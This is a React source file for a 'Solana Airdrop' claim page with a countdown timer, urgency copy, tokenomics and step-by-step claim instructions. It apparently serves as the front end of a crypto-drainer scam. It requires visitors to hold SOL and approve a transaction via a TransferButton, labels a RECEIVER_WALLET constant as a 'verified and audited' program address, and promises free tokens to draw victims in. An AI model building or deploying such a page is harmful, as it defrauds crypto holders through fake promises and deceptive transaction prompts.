// src/App.jsx
import { useMemo, useState, useEffect, useRef } from 'react';
import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import ConnectWallet from './components/ConnectWallet';
import TransferButton from './components/TransferButton';
import { WalletContext } from './contexts/WalletContext';
import { RECEIVER_WALLET } from './utils/constants';
import './styles/airdrop.css';

// Optional: styling for wallet modal
import '@solana/wallet-adapter-react-ui/styles.css';

const CONTRACT_ADDRESS = RECEIVER_WALLET.toBase58();

// ── Countdown Timer ────────────────────────────────────
const AIRDROP_DEADLINE = new Date('2026-04-15T00:00:00Z'); // set your deadline

function useCountdown(target) {
  const [time, setTime] = useState(getRemaining(target));
  useEffect(() => {
    const id = setInterval(() => setTime(getRemaining(target)), 1000);
    return () => clearInterval(id);
  }, [target]);
  return time;
}

function getRemaining(target) {
  const diff = Math.max(0, target - Date.now());
  return {
    days: Math.floor(diff / 86400000),
    hours: Math.floor((diff / 3600000) % 24),
    minutes: Math.floor((diff / 60000) % 60),
    seconds: Math.floor((diff / 1000) % 60),
    ended: diff === 0,
  };
}

function CountdownTimer() {
  const { days, hours, minutes, seconds, ended } = useCountdown(AIRDROP_DEADLINE);
  if (ended) return <div className="countdown-ended">🚨 Airdrop Has Ended</div>;
  return (
    <div className="countdown-wrapper">
      <div className="countdown-label">⏱ Airdrop Ends In</div>
      <div className="countdown-boxes">
        {[['days', days], ['hrs', hours], ['min', minutes], ['sec', seconds]].map(([label, val]) => (
          <div className="countdown-unit" key={label}>
            <span className="countdown-value">{String(val).padStart(2, '0')}</span>
            <span className="countdown-unit-label">{label}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Crypto Rain ────────────────────────────────────────
const RAIN_ITEMS = ['💰', '🪙', '💎', '🎁', '🤑', '💵', '₿', '◎', '🎉', '🚀', '💸', '🏆'];
const RAIN_COUNT = 30;

function CryptoRain() {
  const drops = useMemo(() =>
    Array.from({ length: RAIN_COUNT }, (_, i) => ({
      id: i,
      emoji: RAIN_ITEMS[Math.floor(Math.random() * RAIN_ITEMS.length)],
      left: Math.random() * 100,          // % from left
      delay: Math.random() * 12,           // seconds
      duration: 6 + Math.random() * 10,    // seconds
      size: 0.8 + Math.random() * 1.4,     // rem multiplier
      swing: (Math.random() - 0.5) * 80,   // px horizontal drift
      opacity: 0.15 + Math.random() * 0.35,
    }))
  , []);

  return (
    <div className="crypto-rain" aria-hidden="true">
      {drops.map(d => (
        <span
          key={d.id}
          className="rain-drop"
          style={{
            left: `${d.left}%`,
            animationDelay: `${d.delay}s`,
            animationDuration: `${d.duration}s`,
            fontSize: `${d.size}rem`,
            opacity: d.opacity,
            '--swing': `${d.swing}px`,
          }}
        >
          {d.emoji}
        </span>
      ))}
    </div>
  );
}

export default function App() {
  return (
    <WalletContext>
      <WalletModalProvider>
        <div className="app-container">
          {/* Header */}
          <header className="header">
            <nav className="nav container">
              <div className="logo">Solana Airdrop</div>
              <div id="walletContainer">
                <WalletMultiButton className="!bg-indigo-600 hover:!bg-indigo-700" />
              </div>
            </nav>
          </header>

          {/* Hero Section */}
          <section className="hero">
            <CryptoRain />
            <div className="container">
              <div className="hero-content">
                <div className="hero-text">
                  <h1>
                    Claim Your <span className="highlight">Exclusive</span><br />
                    Solana Airdrop
                  </h1>
                  <p>
                    Join the next generation of DeFi. Connect your wallet and claim exclusive Solana tokens. 
                    Limited time offer with instant rewards for early adopters.
                  </p>
                  <CountdownTimer />
                  <p className="qualification-note">
                    Eligibility: You must have SOL in your wallet to qualify for this airdrop claim.
                  </p>
                  <div className="space-y-4">
                    <ConnectWallet />
    <TransferButton className="
  bg-gradient-to-r from-indigo-600 to-purple-600
  hover:from-indigo-700 hover:to-purple-700
  text-white shadow-lg hover:shadow-xl
  transform hover:scale-105
  transition-all duration-300 ease-in-out
  transfer-btn pulse-glow
" />




                  </div>
                </div>
                <div className="hero-visual">
                  <div className="crypto-orb animate-float"></div>
                </div>
              </div>
            </div>
          </section>

          {/* Info Section - commented out
          <section className="info-section">
            <div className="container">
              <h2 className="section-title">
                Why Choose Our <span className="gradient-text">Airdrop</span>
              </h2>
              <p className="section-description">
                Experience the future of decentralized finance with our revolutionary token distribution system
              </p>
              
              <div className="info-grid">
                <div className="info-card">
                  <div className="info-card-icon">🚀</div>
                  <h3>Instant Claims</h3>
                  <p>Connect your wallet and claim tokens instantly. No waiting periods or complex verification processes.</p>
                </div>
                <div className="info-card">
                  <div className="info-card-icon">🔒</div>
                  <h3>Secure & Safe</h3>
                  <p>Built with industry-leading security standards. Your wallet and assets are always protected.</p>
                </div>
                <div className="info-card">
                  <div className="info-card-icon">🌍</div>
                  <h3>Multi-Chain Support</h3>
                  <p>Compatible with Ethereum, Polygon, and Arbitrum networks. Choose your preferred blockchain.</p>
                </div>
              </div>
            </div>
          </section>
          */}

          {/* Airdrop Rules */}
          <section className="rules-section">
            <div className="container">
              <h2 className="section-title">
                Airdrop <span className="gradient-text">Rules</span>
              </h2>
              <p className="section-description">
                Please review the eligibility criteria and rules before claiming your tokens
              </p>
              <div className="rules-grid">
                <div className="rule-item">
                  <span className="rule-number">01</span>
                  <div>
                    <h4>Wallet Requirement</h4>
                    <p>You must connect a valid Solana wallet with at least 0.01 SOL balance to qualify for the airdrop.</p>
                  </div>
                </div>
                <div className="rule-item">
                  <span className="rule-number">02</span>
                  <div>
                    <h4>One Claim Per Wallet</h4>
                    <p>Each wallet address is eligible for a single claim. Duplicate claims from the same wallet will be rejected.</p>
                  </div>
                </div>
                <div className="rule-item">
                  <span className="rule-number">03</span>
                  <div>
                    <h4>Time-Limited Event</h4>
                    <p>The airdrop is available for a limited period only. Unclaimed tokens after the deadline will be burned.</p>
                  </div>
                </div>
                <div className="rule-item">
                  <span className="rule-number">04</span>
                  <div>
                    <h4>Network Fees</h4>
                    <p>A small Solana network transaction fee (≈0.000005 SOL) applies. This is a standard blockchain fee, not charged by us.</p>
                  </div>
                </div>
                <div className="rule-item">
                  <span className="rule-number">05</span>
                  <div>
                    <h4>No Bots or Scripts</h4>
                    <p>Automated claiming via bots or scripts is strictly prohibited. Violators will be blacklisted.</p>
                  </div>
                </div>
                <div className="rule-item">
                  <span className="rule-number">06</span>
                  <div>
                    <h4>Final & Non-Reversible</h4>
                    <p>All airdrop claims are final and recorded on-chain. Transactions cannot be reversed once confirmed.</p>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Tokenomics */}
          <section className="tokenomics-section">
            <div className="container">
              <h2 className="section-title">
                <span className="gradient-text">Tokenomics</span>
              </h2>
              <p className="section-description">
                A transparent breakdown of our token distribution and allocation strategy
              </p>
              <div className="tokenomics-grid">
                <div className="tokenomics-chart glass-card">
                  <div className="chart-ring">
                    <svg viewBox="0 0 200 200" className="donut-chart">
                      <circle cx="100" cy="100" r="80" fill="none" stroke="var(--secondary)" strokeWidth="24" />
                      <circle cx="100" cy="100" r="80" fill="none" stroke="var(--crypto-purple)" strokeWidth="24"
                        strokeDasharray="150.8 352" strokeDashoffset="0" className="chart-segment" />
                      <circle cx="100" cy="100" r="80" fill="none" stroke="var(--crypto-blue)" strokeWidth="24"
                        strokeDasharray="100.5 402.3" strokeDashoffset="-150.8" className="chart-segment" />
                      <circle cx="100" cy="100" r="80" fill="none" stroke="var(--crypto-cyan)" strokeWidth="24"
                        strokeDasharray="75.4 427.4" strokeDashoffset="-251.3" className="chart-segment" />
                      <circle cx="100" cy="100" r="80" fill="none" stroke="var(--crypto-pink)" strokeWidth="24"
                        strokeDasharray="50.3 452.5" strokeDashoffset="-326.7" className="chart-segment" />
                      <circle cx="100" cy="100" r="80" fill="none" stroke="hsl(142, 70%, 55%)" strokeWidth="24"
                        strokeDasharray="125.6 377.2" strokeDashoffset="-377" className="chart-segment" />
                    </svg>
                    <div className="chart-center-label">1B<br /><small>Total Supply</small></div>
                  </div>
                </div>
                <div className="tokenomics-details">
                  <div className="token-alloc">
                    <div className="alloc-color" style={{ background: 'var(--crypto-purple)' }}></div>
                    <div className="alloc-info">
                      <span className="alloc-label">Community Airdrop</span>
                      <span className="alloc-percent">30%</span>
                    </div>
                    <div className="alloc-bar"><div className="alloc-fill" style={{ width: '30%', background: 'var(--crypto-purple)' }}></div></div>
                  </div>
                  <div className="token-alloc">
                    <div className="alloc-color" style={{ background: 'var(--crypto-blue)' }}></div>
                    <div className="alloc-info">
                      <span className="alloc-label">Liquidity Pool</span>
                      <span className="alloc-percent">20%</span>
                    </div>
                    <div className="alloc-bar"><div className="alloc-fill" style={{ width: '20%', background: 'var(--crypto-blue)' }}></div></div>
                  </div>
                  <div className="token-alloc">
                    <div className="alloc-color" style={{ background: 'var(--crypto-cyan)' }}></div>
                    <div className="alloc-info">
                      <span className="alloc-label">Development & Team</span>
                      <span className="alloc-percent">15%</span>
                    </div>
                    <div className="alloc-bar"><div className="alloc-fill" style={{ width: '15%', background: 'var(--crypto-cyan)' }}></div></div>
                  </div>
                  <div className="token-alloc">
                    <div className="alloc-color" style={{ background: 'var(--crypto-pink)' }}></div>
                    <div className="alloc-info">
                      <span className="alloc-label">Marketing & Partnerships</span>
                      <span className="alloc-percent">10%</span>
                    </div>
                    <div className="alloc-bar"><div className="alloc-fill" style={{ width: '10%', background: 'var(--crypto-pink)' }}></div></div>
                  </div>
                  <div className="token-alloc">
                    <div className="alloc-color" style={{ background: 'hsl(142, 70%, 55%)' }}></div>
                    <div className="alloc-info">
                      <span className="alloc-label">Staking Rewards & Reserve</span>
                      <span className="alloc-percent">25%</span>
                    </div>
                    <div className="alloc-bar"><div className="alloc-fill" style={{ width: '25%', background: 'hsl(142, 70%, 55%)' }}></div></div>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Claim Instructions */}
          <section className="claim-section">
            <div className="container">
              <h2 className="section-title">
                How to <span className="gradient-text">Claim</span>
              </h2>
              <p className="section-description">
                Follow these simple steps to claim your airdrop tokens
              </p>
              <div className="steps-timeline">
                <div className="step-card glass-card">
                  <div className="step-icon">🔗</div>
                  <div className="step-number">Step 1</div>
                  <h3>Connect Your Wallet</h3>
                  <p>Click the "Select Wallet" button in the top-right corner. Choose your preferred Solana wallet (Phantom, Solflare, Trust Wallet, etc.).</p>
                </div>
                <div className="step-connector"></div>
                <div className="step-card glass-card">
                  <div className="step-icon">✅</div>
                  <div className="step-number">Step 2</div>
                  <h3>Verify Eligibility</h3>
                  <p>Ensure you have at least 0.01 SOL in your connected wallet. The system will automatically check your qualification status.</p>
                </div>
                <div className="step-connector"></div>
                <div className="step-card glass-card">
                  <div className="step-icon">🎯</div>
                  <div className="step-number">Step 3</div>
                  <h3>Claim Airdrop</h3>
                  <p>Click the "Claim Airdrop" button and approve the transaction in your wallet. The claim is processed on-chain instantly.</p>
                </div>
                <div className="step-connector"></div>
                <div className="step-card glass-card">
                  <div className="step-icon">🎉</div>
                  <div className="step-number">Step 4</div>
                  <h3>Receive Tokens</h3>
                  <p>Once confirmed, tokens are deposited directly into your wallet. Verify your balance and view the transaction on Solana Explorer.</p>
                </div>
              </div>
            </div>
          </section>

          {/* Smart Contract Address */}
          <section className="contract-section">
            <div className="container">
              <h2 className="section-title">
                Smart Contract <span className="gradient-text">Address</span>
              </h2>
              <p className="section-description">
                Verified and audited — interact with full confidence
              </p>
              <div className="contract-card glass-card">
                <div className="contract-badge">✅ Verified on Solana</div>
                <div className="contract-address-row">
                  <span className="contract-label">Program Address</span>
                  <code className="contract-address">7mhcgF1DVsj5iv4CxZDgp51H6MBBwqamsH1KnqXhSRc5</code>
                  <button
                    className="copy-btn"
                    onClick={() => {
                      navigator.clipboard.writeText(CONTRACT_ADDRESS);
                      document.querySelector('.copy-btn').textContent = 'Copied!';
                      setTimeout(() => {
                        document.querySelector('.copy-btn').textContent = '📋 Copy';
                      }, 2000);
                    }}
                  >
                    📋 Copy
                  </button>
                </div>
                <div className="contract-meta">
                  <div className="meta-item">
                    <span className="meta-label">Network</span>
                    <span className="meta-value">Solana Mainnet</span>
                  </div>
                  <div className="meta-item">
                    <span className="meta-label">Token Standard</span>
                    <span className="meta-value">SPL Token</span>
                  </div>
                  <div className="meta-item">
                    <span className="meta-label">Status</span>
                    <span className="meta-value status-active">● Active</span>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Explorer Links */}
          <section className="explorer-section">
            <div className="container">
              <h2 className="section-title">
                Explorer <span className="gradient-text">Links</span>
              </h2>
              <p className="section-description">
                Track transactions and verify everything on-chain with trusted Solana explorers
              </p>
              <div className="explorer-grid">
                <a
                  href={`https://explorer.solana.com/address/7mhcgF1DVsj5iv4CxZDgp51H6MBBwqamsH1KnqXhSRc5`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="explorer-card glass-card"
                >
                  <div className="explorer-icon">🔎</div>
                  <h3>Solana Explorer</h3>
                  <p>Official Solana block explorer. View account info, transactions, and token balances.</p>
                  <span className="explorer-link-text">explorer.solana.com →</span>
                </a>
                <a
                  href={`https://solscan.io/account/7mhcgF1DVsj5iv4CxZDgp51H6MBBwqamsH1KnqXhSRc5`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="explorer-card glass-card"
                >
                  <div className="explorer-icon">📊</div>
                  <h3>Solscan</h3>
                  <p>Community-favorite explorer with advanced analytics, token tracking, and DeFi insights.</p>
                  <span className="explorer-link-text">solscan.io →</span>
                </a>
                <a
                  href={`https://solana.fm/address/7mhcgF1DVsj5iv4CxZDgp51H6MBBwqamsH1KnqXhSRc5`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="explorer-card glass-card"
                >
                  <div className="explorer-icon">📡</div>
                  <h3>SolanaFM</h3>
                  <p>Detailed on-chain data with a clean interface. Perfect for verifying program activity.</p>
                  <span className="explorer-link-text">solana.fm →</span>
                </a>
              </div>
            </div>
          </section>

          {/* Footer */}
          <footer className="site-footer">
            <div className="container">
              <div className="footer-content">
                <div className="footer-logo">Solana Airdrop</div>
                <p className="footer-note">
                  Wallet options are device-aware: mobile shows mobile wallets, desktop shows desktop wallets.
                </p>
                <p className="footer-copy">© 2026 Solana Airdrop. All rights reserved.</p>
              </div>
            </div>
          </footer>
        </div>
      </WalletModalProvider>
    </WalletContext>
  );
}
